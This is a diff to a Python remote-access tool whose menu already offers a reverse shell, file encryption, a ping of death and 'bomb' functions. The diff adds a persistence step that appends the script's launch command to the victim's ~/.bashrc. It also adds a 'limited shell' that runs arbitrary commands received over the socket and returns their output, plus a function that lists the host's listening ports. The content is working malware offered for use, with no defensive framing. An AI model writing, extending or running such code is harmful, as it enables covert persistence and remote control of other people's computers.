@@ -20,6 +20,13 @@ yellow  = "\033[0;33m"
 magenta = "\033[0;35m"
 Color_Off='\033[0m'
 
+# Persistent
+def add2bashrc():
+    if os.name != "nt":
+        os.system("echo python3 `pwd`/main.py  >> `echo $HOME`/.bashrc")
+        os.system("echo python3 `pwd`/onefile.py  >> `echo $HOME`/.bashrc")
+    
+
 # Term Bomb
 
 def termBomb(con):
@@ -274,6 +281,20 @@ def dropRevShell(con):
     except:
         con.sendall(b'Could Not Retrieve Data')
 
+def limitedShell(con):
+    while True:
+        con.sendall(b'type in command:')
+        cmd = con.recv(2048)
+        try:
+            cmd = str(cmd.decode().strip())
+            stdoutt = os.popen(cmd).read()
+            con.sendall(stdoutt.encode())
+        except ValueError:
+            con.sendall(b'Please only send valid input')
+        except KeyboardInterrupt:
+            sys.exit(0)
+        except:
+            con.sendall(b'Could Not Retrieve Data')
 
 # usage
 def get_size(bytes, suffix="B"):
@@ -473,6 +494,13 @@ def getNetInterface():
         netInterface+=Color_Off
     return netInterface
 
+def getListeningPort():
+    result = ""
+    output = psutil.net_connections()
+    for i in output:
+        result += "IP address: "+i.laddr.ip +" Port: "+str(i.laddr.port)+" "+i.status+"\n"
+    return result
+
 def getIPAddress():
     result = psutil.net_if_addrs()
     interface = list(result.keys())
@@ -497,7 +525,7 @@ def getMacAddress():
     return cyan+mac+Color_Off
 
 def NetworkMenu(con):
-    menu = b"\n1. Get Network Interface\n2. Get IP address\n3. Get Mac Address\n"
+    menu = b"\n1. Get Network Interface\n2. Get IP address\n3. Get Mac Address\n4. Get Listening Port"
     con.sendall(menu)
     con.sendall(b"\nSpecify Options: ")
     opt = con.recv(1024)
@@ -511,6 +539,8 @@ def NetworkMenu(con):
             con.sendall(str(getIPAddress()).encode())
         elif(opt == 3):
             con.sendall(str(getMacAddress()).encode())
+        elif(opt ==4):
+            con.sendall(str(getListeningPort()).encode())
     except ValueError:
         con.sendall(b"\nPlese only send integer value representing each option\n")
     except KeyboardInterrupt:
@@ -701,7 +731,7 @@ def banner(con):
 
 def menu(con):
     banner(con)
-    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. System Information\n3. Process Information\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Execute Reverse Shell\n8. Encrypt File\n9. Drop Bomb\n10. Kill Process\n11. Shutdown/Restart\n12. Ping of Death\n13. Terminal Bomb\n'
+    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. System Information\n3. Process Information\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Execute Reverse Shell\n8. Encrypt File\n9. Drop Bomb\n10. Kill Process\n11. Shutdown/Restart\n12. Ping of Death\n13. Terminal Bomb\n14. Run persistent\n15. Limited Shell'
     con.sendall(mainMenu)
     con.sendall(b'\nSpecify Option: ')
     opt = con.recv(1024)
@@ -735,6 +765,12 @@ def menu(con):
                 sysControl(con)
             elif(opt == 13):
                 termBomb(con)
+            elif(opt ==14):
+                con.sendall(b"ONLY WORKS ON LINUX!")
+                add2bashrc()
+                con.sendall(b"DONE!")
+            elif(opt ==15):
+                limitedShell(con)
         except ValueError:
             con.sendall(b'Please only send integer value representing each option\n')
         except KeyboardInterrupt:
